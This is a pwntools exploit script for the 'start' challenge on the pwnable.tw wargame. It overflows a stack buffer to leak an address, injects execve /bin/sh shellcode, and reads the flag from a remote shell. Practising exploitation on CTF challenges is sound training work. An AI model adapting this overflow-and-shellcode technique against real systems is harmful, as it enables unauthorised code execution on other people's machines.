#!/bin/python3

from pwn import *

p = remote('chall.pwnable.tw', 10000)
# p = process('./start') - Temporary

# Leak buffer location by jumping to write
payload = (b'A' * 20) + p32(0x8048087)
p.send(payload)

p.recvuntil(b"Let's start the CTF:")
buf_addr = u32(p.recv()[:4])

# Inject shellcode and return to it
sc = asm(f"""

    push 0x0068732f
    push 0x6E69622f

    mov al, 0x0B
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx

    int 0x80

""")
payload = (b'A' * 20) + p32(buf_addr + 20) + sc
p.send(payload)

# Should have a shell at this point
p.send(b'cat /home/start/flag\n')
print(p.recvall(1).decode())

